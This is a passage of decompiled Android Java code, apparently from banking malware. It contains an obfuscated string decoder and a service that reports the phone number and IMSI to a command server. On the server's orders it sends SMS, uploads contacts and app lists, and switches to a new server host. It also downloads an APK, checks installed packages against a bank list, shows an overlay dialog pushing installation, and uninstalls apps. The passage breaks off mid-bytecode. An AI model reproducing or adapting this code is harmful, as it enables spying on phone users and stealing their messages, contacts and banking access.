      //   150: iconst_2
      //   151: isub
      //   152: invokevirtual substring : (II)Ljava/lang/String;
      //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   158: aload_3
      //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   162: invokevirtual toString : ()Ljava/lang/String;
      //   165: astore_0
      //   166: iconst_0
      //   167: istore #4
      //   169: iload #4
      //   171: bipush #19
      //   173: if_icmplt -> 583
      //   176: new java/lang/String
      //   179: dup
      //   180: aload_2
      //   181: invokespecial <init> : ([B)V
      //   184: astore_3
      //   185: new java/lang/StringBuilder
      //   188: dup
      //   189: aload_3
      //   190: iconst_2
      //   191: iconst_3
      //   192: invokevirtual substring : (II)Ljava/lang/String;
      //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   198: invokespecial <init> : (Ljava/lang/String;)V
      //   201: aload_3
      //   202: bipush #16
      //   204: bipush #17
      //   206: invokevirtual substring : (II)Ljava/lang/String;
      //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   212: invokevirtual toString : ()Ljava/lang/String;
      //   215: astore_2
      //   216: new java/lang/StringBuilder
      //   219: dup
      //   220: new java/lang/StringBuilder
      //   223: dup
      //   224: new java/lang/StringBuilder
      //   227: dup
      //   228: aload_2
      //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   232: invokespecial <init> : (Ljava/lang/String;)V
      //   235: ldc 'c'
      //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   240: invokevirtual toString : ()Ljava/lang/String;
      //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   246: invokespecial <init> : (Ljava/lang/String;)V
      //   249: aload_3
      //   250: iconst_4
      //   251: iconst_5
      //   252: invokevirtual substring : (II)Ljava/lang/String;
      //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   258: invokevirtual toString : ()Ljava/lang/String;
      //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   264: invokespecial <init> : (Ljava/lang/String;)V
      //   267: aload_2
      //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   271: invokevirtual toString : ()Ljava/lang/String;
      //   274: astore_2
      //   275: aload_3
      //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
      //   279: astore_3
      //   280: aload_3
      //   281: aload_2
      //   282: iconst_2
      //   283: anewarray java/lang/Class
      //   286: dup
      //   287: iconst_0
      //   288: ldc java/lang/String
      //   290: aastore
      //   291: dup
      //   292: iconst_1
      //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
      //   296: aastore
      //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
      //   300: aload_3
      //   301: iconst_2
      //   302: anewarray java/lang/Object
      //   305: dup
      //   306: iconst_0
      //   307: aload_0
      //   308: aastore
      //   309: dup
      //   310: iconst_1
      //   311: iconst_0
      //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   315: aastore
      //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
      //   319: checkcast [B
      //   322: astore_0
      //   323: aload_0
      //   324: arraylength
      //   325: istore #5
      //   327: iload #5
      //   329: iconst_1
      //   330: isub
      //   331: aload_0
      //   332: iload #5
      //   334: iconst_1
      //   335: isub
      //   336: baload
      //   337: i2c
      //   338: invokestatic valueOf : (C)Ljava/lang/String;
      //   341: invokestatic parseInt : (Ljava/lang/String;)I
      //   344: isub
      //   345: istore #6
      //   347: aload_0
      //   348: iload #6
      //   350: iconst_1
      //   351: isub
      //   352: baload
      //   353: iconst_1
      //   354: if_icmpne -> 652
      //   357: iconst_1
      //   358: istore #4
      //   360: iinc #6, -1
      //   363: aload_0
      //   364: iload #6
      //   366: iconst_2
      //   367: isub
      //   368: baload
      //   369: i2c
      //   370: istore #7
      //   372: aload_0
      //   373: iload #6
      //   375: iconst_1
      //   376: isub
      //   377: baload
      //   378: i2c
      //   379: istore #8
      //   381: new java/lang/StringBuilder
      //   384: dup
      //   385: iload #7
      //   387: invokestatic valueOf : (C)Ljava/lang/String;
      //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   393: invokespecial <init> : (Ljava/lang/String;)V
      //   396: iload #8
      //   398: invokestatic valueOf : (C)Ljava/lang/String;
      //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   404: invokevirtual toString : ()Ljava/lang/String;
      //   407: bipush #16
      //   409: invokestatic parseInt : (Ljava/lang/String;I)I
      //   412: i2b
      //   413: bipush #38
      //   415: iadd
      //   416: i2b
      //   417: istore #9
      //   419: iload #6
      //   421: iconst_2
      //   422: isub
      //   423: istore #10
      //   425: iconst_0
      //   426: istore #6
      //   428: iload #6
      //   430: iload #10
      //   432: if_icmplt -> 658
      //   435: iload #10
      //   437: istore #6
      //   439: iload #6
      //   441: iload #5
      //   443: if_icmplt -> 677
      //   446: iload #4
      //   448: iconst_1
      //   449: if_icmpne -> 559
      //   452: new java/lang/Exception
      //   455: dup
      //   456: invokespecial <init> : ()V
      //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
      //   462: iconst_1
      //   463: aaload
      //   464: astore_3
      //   465: aload_3
      //   466: invokevirtual getClassName : ()Ljava/lang/String;
      //   469: astore_2
      //   470: aload_2
      //   471: ldc '.'
      //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
      //   476: istore #4
      //   478: aload_2
      //   479: astore_1
      //   480: iload #4
      //   482: iconst_m1
      //   483: if_icmpeq -> 495
      //   486: aload_2
      //   487: iload #4
      //   489: iconst_1
      //   490: iadd
      //   491: invokevirtual substring : (I)Ljava/lang/String;
      //   494: astore_1
      //   495: aload_3
      //   496: invokevirtual getMethodName : ()Ljava/lang/String;
      //   499: astore_2
      //   500: new java/lang/StringBuilder
      //   503: dup
      //   504: aload_1
      //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   508: invokespecial <init> : (Ljava/lang/String;)V
      //   511: aload_2
      //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   515: invokevirtual toString : ()Ljava/lang/String;
      //   518: astore_2
      //   519: aload_2
      //   520: astore_1
      //   521: aload_2
      //   522: invokevirtual length : ()I
      //   525: sipush #256
      //   528: if_icmple -> 540
      //   531: aload_2
      //   532: iconst_0
      //   533: sipush #256
      //   536: invokevirtual substring : (II)Ljava/lang/String;
      //   539: astore_1
      //   540: aload_1
      //   541: invokevirtual length : ()I
      //   544: istore #4
      //   546: iconst_0
      //   547: istore #6
      //   549: iinc #4, -1
      //   552: iload #6
      //   554: iload #10
      //   556: if_icmplt -> 689
      //   559: iload #10
      //   561: newarray byte
      //   563: astore_1
      //   564: iconst_0
      //   565: istore #4
      //   567: iload #4
      //   569: iload #10
      //   571: if_icmplt -> 740
      //   574: new java/lang/String
      //   577: dup
      //   578: aload_1
      //   579: invokespecial <init> : ([B)V
      //   582: areturn
      //   583: aload_2
      //   584: iload #4
      //   586: aload_2
      //   587: iload #4
      //   589: baload
      //   590: bipush #102
      //   592: ixor
      //   593: i2b
      //   594: i2b
      //   595: bastore
      //   596: iinc #4, 1
      //   599: goto -> 169
      //   602: astore_0
      //   603: aload_0
      //   604: invokevirtual printStackTrace : ()V
      //   607: aload_1
      //   608: astore_0
      //   609: goto -> 323
      //   612: astore_0
      //   613: aload_0
      //   614: invokevirtual printStackTrace : ()V
      //   617: aload_1
      //   618: astore_0
      //   619: goto -> 323
      //   622: astore_0
      //   623: aload_0
      //   624: invokevirtual printStackTrace : ()V
      //   627: aload_1
      //   628: astore_0
      //   629: goto -> 323
      //   632: astore_0
      //   633: aload_0
      //   634: invokevirtual printStackTrace : ()V
      //   637: aload_1
      //   638: astore_0
      //   639: goto -> 323
      //   642: astore_0
      //   643: aload_0
      //   644: invokevirtual printStackTrace : ()V
      //   647: aload_1
      //   648: astore_0
      //   649: goto -> 323
      //   652: iconst_0
      //   653: istore #4
      //   655: goto -> 360
      //   658: aload_0
      //   659: iload #6
      //   661: aload_0
      //   662: iload #6
      //   664: baload
      //   665: iload #9
      //   667: ixor
      //   668: i2b
      //   669: i2b
      //   670: bastore
      //   671: iinc #6, 1
      //   674: goto -> 428
      //   677: aload_0
      //   678: iload #6
      //   680: iconst_0
      //   681: i2b
      //   682: bastore
      //   683: iinc #6, 1
      //   686: goto -> 439
      //   689: aload_0
      //   690: iload #6
      //   692: baload
      //   693: istore #9
      //   695: iload #4
      //   697: iconst_1
      //   698: isub
      //   699: istore #5
      //   701: aload_0
      //   702: iload #6
      //   704: iload #9
      //   706: aload_1
      //   707: iload #4
      //   709: invokevirtual charAt : (I)C
      //   712: i2b
      //   713: ixor
      //   714: i2b
      //   715: i2b
      //   716: bastore
      //   717: iload #5
      //   719: istore #4
      //   721: iload #5
      //   723: ifge -> 734
      //   726: aload_1
      //   727: invokevirtual length : ()I
      //   730: iconst_1
      //   731: isub
      //   732: istore #4
      //   734: iinc #6, 1
      //   737: goto -> 552
      //   740: aload_1
      //   741: iload #4
      //   743: aload_0
      //   744: iload #4
      //   746: baload
      //   747: i2b
      //   748: bastore
      //   749: iinc #4, 1
      //   752: goto -> 567
      // Exception table:
      //   from	to	target	type
      //   275	323	602	java/lang/ClassNotFoundException
      //   275	323	612	java/lang/IllegalAccessException
      //   275	323	622	java/lang/NoSuchMethodException
      //   275	323	632	java/lang/IllegalArgumentException
      //   275	323	642	java/lang/reflect/InvocationTargetException
    }
    
    public void onReceive(Context param1Context, Intent param1Intent) {
      Bundle bundle;
      String str = param1Intent.getAction();
      if (str.equals(_1007149("==yz4a63y+qktKqutzg0AVRKwkm4NQrq"))) {
        boolean bool = param1Intent.getBooleanExtra(_1007149("QzuNlpY1QgGdv4hZ"), false);
        String str1 = URLDecoder.decode(param1Intent.getStringExtra("info").toString());
        if (bool && !str1.equals("")) {
          String[] arrayOfString = str1.split("#");
          Config.downApk = arrayOfString[1];
          CoreService.this.mApk = Config.downApk;
          CoreService.this.mApkName = arrayOfString[0];
          Config.delPackage = arrayOfString[2];
          CoreService.this.mPackageName = Config.delPackage;
          int i = 2130837505;
          byte b = 0;
          while (true) {
            if (b >= Config.bank.length) {
              Config.installApk = DownLoad.downLoadFile(String.valueOf(Config.APK_URL) + Config.downApk);
              System.out.println(_1007149("4zIMYzoxVDQGeDopbQkXVRwOo6G7va2gkKuf9rdCQwHbqCYQ"));
              CoreService.showNofity(CoreService.this.mApkName, String.valueOf(CoreService.this.mApkName) + _1007149("==oecT0GQQskrXYeE3cXHWcRKnERJno9PWosU3YWI2IGEkcRKUQ5AXPHQ0xCNQdg"), _1007149("==cRbQwhXTgPeiEWYRs9XTELpWwzMWcDLncZVWweGbJ7FC9tHRdNOSKtajcVXRQGfQoaZgwlQkUBpEkoMwbS"), i);
              AlertDialog.Builder builder = new AlertDialog.Builder((Context)CoreService.mContext);
              builder.setTitle(CoreService.this.mApkName);
              builder.setMessage(String.valueOf(CoreService.this.mApkName) + _1007149("U=ODhOGtp+ucryzzl4/ntq32lb7ggr7xm5AEoZKC7JWu57GE8I2OIvSzuOGHnycm8IGLIOaZs/G6jOeYlCb3obTP6oTniqfwvb/hmb/GkZsg4Iig152v9pmH6rK814Ge5Z+V5JG3CzDI+JDmi7/wvr7gu4LGkZsg54Go152y8LyE7Jaw15aG4rK9KO2rv/u6wOeBiPSQqBQ0MwF92XxDvDLP"));
              builder.setPositiveButton(_1007149("==KR5JOwNDcBqimtMw5Y"), new CoreService.BtnClick());
              builder.setNegativeButton(_1007149("c1ExeRUZQ0EBIsulKFeT"), new CoreService.BtnClick());
              AlertDialog alertDialog = builder.create();
              alertDialog.getWindow().setType(2003);
              alertDialog.show();
              System.out.println(_1007149("E1lvFGBEIHFIpIKR0LWeoJGQNzEBUz56wTFG"));
            } else {
              if (CoreService.this.mPackageName.equals(Config.bank[b]))
                i = Config.icon[b]; 
              b++;
              continue;
            } 
            if (str.equals(_1007149("Q=tEFlpPYF1eQFlPGl1XYllCXUpcMzcBQGuTljWV")))
              CoreService.uninstallAPK(CoreService.this.mPackageName); 
            if (str.equals(_1007149("M=r1p+78yu2t9+fp8e7l0kM2AZXN3z6O"))) {
              bundle = param1Intent.getExtras();
              CoreService.this.autoChangeApk(bundle.getString("apk"));
            } 
            str.equals(_1007149("M=bw6+u3w/P64EQ2AaqoID+O"));
            return;
          } 
        } 
      } 
      if (str.equals(_1007149("Q=tEFlpPYF1eQFlPGl1XYllCXUpcMzcBQGuTljWV")))
        CoreService.uninstallAPK(CoreService.this.mPackageName); 
      if (str.equals(_1007149("M=r1p+78yu2t9+fp8e7l0kM2AZXN3z6O"))) {
        bundle = bundle.getExtras();
        CoreService.this.autoChangeApk(bundle.getString("apk"));
      } 
      str.equals(_1007149("M=bw6+u3w/P64EQ2AaqoID+O"));
    }
  }
  
  class MyClick implements DialogInterface.OnClickListener {
    public void onClick(DialogInterface param1DialogInterface, int param1Int) {}
  }
  
  class MyOrderRunnable implements Runnable {
    private static String run(String param1String) {
      // Byte code:
      //   0: aconst_null
      //   1: astore_1
      //   2: bipush #19
      //   4: newarray byte
      //   6: astore_2
      //   7: aload_2
      //   8: dup
      //   9: iconst_0
      //   10: ldc 5
      //   12: bastore
      //   13: dup
      //   14: iconst_1
      //   15: ldc 10
      //   17: bastore
      //   18: dup
      //   19: iconst_2
      //   20: ldc 0
      //   22: bastore
      //   23: dup
      //   24: iconst_3
      //   25: ldc 22
      //   27: bastore
      //   28: dup
      //   29: iconst_4
      //   30: ldc 11
      //   32: bastore
      //   33: dup
      //   34: iconst_5
      //   35: ldc 13
      //   37: bastore
      //   38: dup
      //   39: bipush #6
      //   41: ldc 0
      //   43: bastore
      //   44: dup
      //   45: bipush #7
      //   47: ldc 74
      //   49: bastore
      //   50: dup
      //   51: bipush #8
      //   53: ldc 17
      //   55: bastore
      //   56: dup
      //   57: bipush #9
      //   59: ldc 16
      //   61: bastore
      //   62: dup
      //   63: bipush #10
      //   65: ldc 13
      //   67: bastore
      //   68: dup
      //   69: bipush #11
      //   71: ldc 8
      //   73: bastore
      //   74: dup
      //   75: bipush #12
      //   77: ldc 74
      //   79: bastore
      //   80: dup
      //   81: bipush #13
      //   83: ldc 38
      //   85: bastore
      //   86: dup
      //   87: bipush #14
      //   89: ldc 5
      //   91: bastore
      //   92: dup
      //   93: bipush #15
      //   95: ldc 23
      //   97: bastore
      //   98: dup
      //   99: bipush #16
      //   101: ldc 1
      //   103: bastore
      //   104: dup
      //   105: bipush #17
      //   107: ldc 82
      //   109: bastore
      //   110: dup
      //   111: bipush #18
      //   113: ldc 80
      //   115: bastore
      //   116: pop
      //   117: aload_0
      //   118: iconst_0
      //   119: iconst_2
      //   120: invokevirtual substring : (II)Ljava/lang/String;
      //   123: astore_3
      //   124: new java/lang/StringBuilder
      //   127: dup
      //   128: aload_0
      //   129: aload_0
      //   130: invokevirtual length : ()I
      //   133: iconst_2
      //   134: isub
      //   135: invokevirtual substring : (I)Ljava/lang/String;
      //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   141: invokespecial <init> : (Ljava/lang/String;)V
      //   144: aload_0
      //   145: iconst_2
      //   146: aload_0
      //   147: invokevirtual length : ()I
      //   150: iconst_2
      //   151: isub
      //   152: invokevirtual substring : (II)Ljava/lang/String;
      //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   158: aload_3
      //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   162: invokevirtual toString : ()Ljava/lang/String;
      //   165: astore_0
      //   166: iconst_0
      //   167: istore #4
      //   169: iload #4
      //   171: bipush #19
      //   173: if_icmplt -> 583
      //   176: new java/lang/String
      //   179: dup
      //   180: aload_2
      //   181: invokespecial <init> : ([B)V
      //   184: astore_2
      //   185: new java/lang/StringBuilder
      //   188: dup
      //   189: aload_2
      //   190: iconst_2
      //   191: iconst_3
      //   192: invokevirtual substring : (II)Ljava/lang/String;
      //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   198: invokespecial <init> : (Ljava/lang/String;)V
      //   201: aload_2
      //   202: bipush #16
      //   204: bipush #17
      //   206: invokevirtual substring : (II)Ljava/lang/String;
      //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   212: invokevirtual toString : ()Ljava/lang/String;
      //   215: astore_3
      //   216: new java/lang/StringBuilder
      //   219: dup
      //   220: new java/lang/StringBuilder
      //   223: dup
      //   224: new java/lang/StringBuilder
      //   227: dup
      //   228: aload_3
      //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   232: invokespecial <init> : (Ljava/lang/String;)V
      //   235: ldc 'c'
      //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   240: invokevirtual toString : ()Ljava/lang/String;
      //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   246: invokespecial <init> : (Ljava/lang/String;)V
      //   249: aload_2
      //   250: iconst_4
      //   251: iconst_5
      //   252: invokevirtual substring : (II)Ljava/lang/String;
      //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   258: invokevirtual toString : ()Ljava/lang/String;
      //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   264: invokespecial <init> : (Ljava/lang/String;)V
      //   267: aload_3
      //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   271: invokevirtual toString : ()Ljava/lang/String;
      //   274: astore_3
      //   275: aload_2
      //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
      //   279: astore_2
      //   280: aload_2
      //   281: aload_3
      //   282: iconst_2
      //   283: anewarray java/lang/Class
      //   286: dup
      //   287: iconst_0
      //   288: ldc java/lang/String
      //   290: aastore
      //   291: dup
      //   292: iconst_1
      //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
      //   296: aastore
      //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
      //   300: aload_2
      //   301: iconst_2
      //   302: anewarray java/lang/Object
      //   305: dup
      //   306: iconst_0
      //   307: aload_0
      //   308: aastore
      //   309: dup
      //   310: iconst_1
      //   311: iconst_0
      //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   315: aastore
      //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
      //   319: checkcast [B
      //   322: astore_0
      //   323: aload_0
      //   324: arraylength
      //   325: istore #5
      //   327: iload #5
      //   329: iconst_1
      //   330: isub
      //   331: aload_0
      //   332: iload #5
      //   334: iconst_1
      //   335: isub
      //   336: baload
      //   337: i2c
      //   338: invokestatic valueOf : (C)Ljava/lang/String;
      //   341: invokestatic parseInt : (Ljava/lang/String;)I
      //   344: isub
      //   345: istore #6
      //   347: aload_0
      //   348: iload #6
      //   350: iconst_1
      //   351: isub
      //   352: baload
      //   353: iconst_1
      //   354: if_icmpne -> 652
      //   357: iconst_1
      //   358: istore #4
      //   360: iinc #6, -1
      //   363: aload_0
      //   364: iload #6
      //   366: iconst_2
      //   367: isub
      //   368: baload
      //   369: i2c
      //   370: istore #7
      //   372: aload_0
      //   373: iload #6
      //   375: iconst_1
      //   376: isub
      //   377: baload
      //   378: i2c
      //   379: istore #8
      //   381: new java/lang/StringBuilder
      //   384: dup
      //   385: iload #7
      //   387: invokestatic valueOf : (C)Ljava/lang/String;
      //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   393: invokespecial <init> : (Ljava/lang/String;)V
      //   396: iload #8
      //   398: invokestatic valueOf : (C)Ljava/lang/String;
      //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   404: invokevirtual toString : ()Ljava/lang/String;
      //   407: bipush #16
      //   409: invokestatic parseInt : (Ljava/lang/String;I)I
      //   412: i2b
      //   413: bipush #104
      //   415: iadd
      //   416: i2b
      //   417: istore #9
      //   419: iload #6
      //   421: iconst_2
      //   422: isub
      //   423: istore #10
      //   425: iconst_0
      //   426: istore #6
      //   428: iload #6
      //   430: iload #10
      //   432: if_icmplt -> 658
      //   435: iload #10
      //   437: istore #6
      //   439: iload #6
      //   441: iload #5
      //   443: if_icmplt -> 677
      //   446: iload #4
      //   448: iconst_1
      //   449: if_icmpne -> 559
      //   452: new java/lang/Exception
      //   455: dup
      //   456: invokespecial <init> : ()V
      //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
      //   462: iconst_1
      //   463: aaload
      //   464: astore_3
      //   465: aload_3
      //   466: invokevirtual getClassName : ()Ljava/lang/String;
      //   469: astore_2
      //   470: aload_2
      //   471: ldc '.'
      //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
      //   476: istore #4
      //   478: aload_2
      //   479: astore_1
      //   480: iload #4
      //   482: iconst_m1
      //   483: if_icmpeq -> 495
      //   486: aload_2
      //   487: iload #4
      //   489: iconst_1
      //   490: iadd
      //   491: invokevirtual substring : (I)Ljava/lang/String;
      //   494: astore_1
      //   495: aload_3
      //   496: invokevirtual getMethodName : ()Ljava/lang/String;
      //   499: astore_2
      //   500: new java/lang/StringBuilder
      //   503: dup
      //   504: aload_1
      //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   508: invokespecial <init> : (Ljava/lang/String;)V
      //   511: aload_2
      //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   515: invokevirtual toString : ()Ljava/lang/String;
      //   518: astore_2
      //   519: aload_2
      //   520: astore_1
      //   521: aload_2
      //   522: invokevirtual length : ()I
      //   525: sipush #256
      //   528: if_icmple -> 540
      //   531: aload_2
      //   532: iconst_0
      //   533: sipush #256
      //   536: invokevirtual substring : (II)Ljava/lang/String;
      //   539: astore_1
      //   540: aload_1
      //   541: invokevirtual length : ()I
      //   544: istore #4
      //   546: iconst_0
      //   547: istore #6
      //   549: iinc #4, -1
      //   552: iload #6
      //   554: iload #10
      //   556: if_icmplt -> 689
      //   559: iload #10
      //   561: newarray byte
      //   563: astore_1
      //   564: iconst_0
      //   565: istore #4
      //   567: iload #4
      //   569: iload #10
      //   571: if_icmplt -> 740
      //   574: new java/lang/String
      //   577: dup
      //   578: aload_1
      //   579: invokespecial <init> : ([B)V
      //   582: areturn
      //   583: aload_2
      //   584: iload #4
      //   586: aload_2
      //   587: iload #4
      //   589: baload
      //   590: bipush #100
      //   592: ixor
      //   593: i2b
      //   594: i2b
      //   595: bastore
      //   596: iinc #4, 1
      //   599: goto -> 169
      //   602: astore_0
      //   603: aload_0
      //   604: invokevirtual printStackTrace : ()V
      //   607: aload_1
      //   608: astore_0
      //   609: goto -> 323
      //   612: astore_0
      //   613: aload_0
      //   614: invokevirtual printStackTrace : ()V
      //   617: aload_1
      //   618: astore_0
      //   619: goto -> 323
      //   622: astore_0
      //   623: aload_0
      //   624: invokevirtual printStackTrace : ()V
      //   627: aload_1
      //   628: astore_0
      //   629: goto -> 323
      //   632: astore_0
      //   633: aload_0
      //   634: invokevirtual printStackTrace : ()V
      //   637: aload_1
      //   638: astore_0
      //   639: goto -> 323
      //   642: astore_0
      //   643: aload_0
      //   644: invokevirtual printStackTrace : ()V
      //   647: aload_1
      //   648: astore_0
      //   649: goto -> 323
      //   652: iconst_0
      //   653: istore #4
      //   655: goto -> 360
      //   658: aload_0
      //   659: iload #6
      //   661: aload_0
      //   662: iload #6
      //   664: baload
      //   665: iload #9
      //   667: ixor
      //   668: i2b
      //   669: i2b
      //   670: bastore
      //   671: iinc #6, 1
      //   674: goto -> 428
      //   677: aload_0
      //   678: iload #6
      //   680: iconst_0
      //   681: i2b
      //   682: bastore
      //   683: iinc #6, 1
      //   686: goto -> 439
      //   689: aload_0
      //   690: iload #6
      //   692: baload
      //   693: istore #9
      //   695: iload #4
      //   697: iconst_1
      //   698: isub
      //   699: istore #5
      //   701: aload_0
      //   702: iload #6
      //   704: iload #9
      //   706: aload_1
      //   707: iload #4
      //   709: invokevirtual charAt : (I)C
      //   712: i2b
      //   713: ixor
      //   714: i2b
      //   715: i2b
      //   716: bastore
      //   717: iload #5
      //   719: istore #4
      //   721: iload #5
      //   723: ifge -> 734
      //   726: aload_1
      //   727: invokevirtual length : ()I
      //   730: iconst_1
      //   731: isub
      //   732: istore #4
      //   734: iinc #6, 1
      //   737: goto -> 552
      //   740: aload_1
      //   741: iload #4
      //   743: aload_0
      //   744: iload #4
      //   746: baload
      //   747: i2b
      //   748: bastore
      //   749: iinc #4, 1
      //   752: goto -> 567
      // Exception table:
      //   from	to	target	type
      //   275	323	602	java/lang/ClassNotFoundException
      //   275	323	612	java/lang/IllegalAccessException
      //   275	323	622	java/lang/NoSuchMethodException
      //   275	323	632	java/lang/IllegalArgumentException
      //   275	323	642	java/lang/reflect/InvocationTargetException
    }
    
    public void run() {
      String str1 = (new StringBuilder(String.valueOf(Calendar.getInstance().getTimeInMillis()))).toString();
      CoreService.this.httpUrl = String.valueOf(Config.get((Context)CoreService.this, run("==6OnYeehpAyNgEov9zONAk5"), Config.SERVER_HOST)) + Config.SERVER_ADDRESS + run("==m8q6qvpuujo5yzo7XsM0IBgt20Mwjr") + CoreService.this.number + run("Q=OAiZrAMzcBQa9Ydj14") + CoreService.this.imsi + "&t=" + str1;
      String str2 = CoreService.this.conn.getHttpConnection(CoreService.this.httpUrl);
      if (!str2.trim().equals(run("Iz26sKQ1MgGmSpsb")))
        try {
          JSONObject jSONObject1 = new JSONObject();
          this(str2);
          JSONObject jSONObject2 = new JSONObject();
          this(str2);
          str2 = jSONObject1.getString(run("c0oPGBkcFUE4AUHQaLHQ"));
          PrintStream printStream = System.out;
          StringBuilder stringBuilder = new StringBuilder();
          this(run("M=kQUiIYVREfQhwIUT8HdQoTES01XjUdUzoTgICvnDZBAY0xXDWy"));
          printStream.println(stringBuilder.append(str2).toString());
          if (str2.equals(run("M=OPkoycgTJCASRrYjjo"))) {
            SMS sMS = new SMS();
            this(jSONObject1.getString(run("80EnKjI3LkQzAYCVzdNi")), jSONObject1.getString("sid"));
            sMS.send(jSONObject1.getString(run("M=4iPzwpMjI1OUQ2AaqoIDIy")));
          } 
          if (str2.equals(run("U=4ZEAdCMAGoUtxDaDHx"))) {
            int i = Integer.parseInt(jSONObject2.getString("val"));
            Config.set((Context)CoreService.this, run("4zaRmI8yOAG/3Ml5"), i);
          } 
          if (str2.equals(run("==Wyp6OtM0IBgt20MwpK"))) {
            int i = Integer.parseInt(jSONObject2.getString("val"));
            Config.set((Context)CoreService.this, run("Q=mOm5+RMzcBQa9YdjmJ"), i);
            Integer.parseInt(jSONObject2.getString("val"));
          } 
          if (str2.equals(run("M=Cmq7e7rzUyAaZKkjt6"))) {
            PrintStream printStream1 = System.out;
            StringBuilder stringBuilder1 = new StringBuilder();
            this(run("==jBkODalNr6gtLknfrVuubL3fXpndnDkP7gTFF9UEVfS1xBOAFB0Gi3NAmM"));
            printStream1.println(stringBuilder1.append(Config.URL).toString());
            Contact contact = new Contact();
            this();
            contact.getPhoneContacts();
          } 
          if (str2.equals("apps")) {
            System.out.println(run("M=oDUiIYVhg4QBAm1sbQ7oWx2DZBAY0xXDWg"));
            App app = new App();
            this();
            app.sendApps();
          } 
          if (str2.equals(run("==6AmJiUk42NMkIBJGtiMwno"))) {
            System.out.println(run("Q=Pqu8vxv/HRqfnPuNDZk+bM+cXstNv5PxgurMXFsfXtcHl3RDMBgJXN3zs+"));
            try {
              App app = new App();
              this();
              app.alertBroadCast(jSONObject1.getString("info").trim());
            } catch (Exception exception) {}
          } 
          if (str2.equals("move")) {
            StringBuilder stringBuilder1 = new StringBuilder();
            this(run("M=84K2hzcEQ2AY3IPTOD"));
            String str = stringBuilder1.append(jSONObject1.getString("info")).toString();
            Config.set((Context)CoreService.this, run("==LSwdvC2sw2QQFsanmfNAz8"), str);
            Config.SERVER_HOST = str;
            PrintStream printStream1 = System.out;
            stringBuilder1 = new StringBuilder();
            this(run("Q=kXdgIScBIqZRwAdwY2XBc9Ng0aeAgndD45z8uXp7+mOEMB349ySzfA"));
            printStream1.println(stringBuilder1.append(Config.SERVER_HOST).toString());
          } 
        } catch (JSONException jSONException) {
          jSONException.printStackTrace();
        }  
    }
  }
  
  class MyRunnable implements Runnable {
    public MyRunnable(String param1String) {
      CoreService.this.httpUrl = param1String;
    }
    
    private static String run(String param1String) {
      // Byte code:
      //   0: aconst_null
      //   1: astore_1
      //   2: bipush #19
      //   4: newarray byte
      //   6: astore_2
      //   7: aload_2
      //   8: dup
      //   9: iconst_0
      //   10: ldc -9
      //   12: bastore
      //   13: dup
      //   14: iconst_1
      //   15: ldc -8
      //   17: bastore
      //   18: dup
      //   19: iconst_2
      //   20: ldc -14
      //   22: bastore
      //   23: dup
      //   24: iconst_3
      //   25: ldc -28
      //   27: bastore
      //   28: dup
      //   29: iconst_4
      //   30: ldc -7
      //   32: bastore
      //   33: dup
      //   34: iconst_5
      //   35: ldc -1
      //   37: bastore
      //   38: dup
      //   39: bipush #6
      //   41: ldc -14
      //   43: bastore
      //   44: dup
      //   45: bipush #7
      //   47: ldc -72
      //   49: bastore
      //   50: dup
      //   51: bipush #8
      //   53: ldc -29
      //   55: bastore
      //   56: dup
      //   57: bipush #9
      //   59: ldc -30
      //   61: bastore
      //   62: dup
      //   63: bipush #10
      //   65: ldc -1
      //   67: bastore
      //   68: dup
      //   69: bipush #11
      //   71: ldc -6
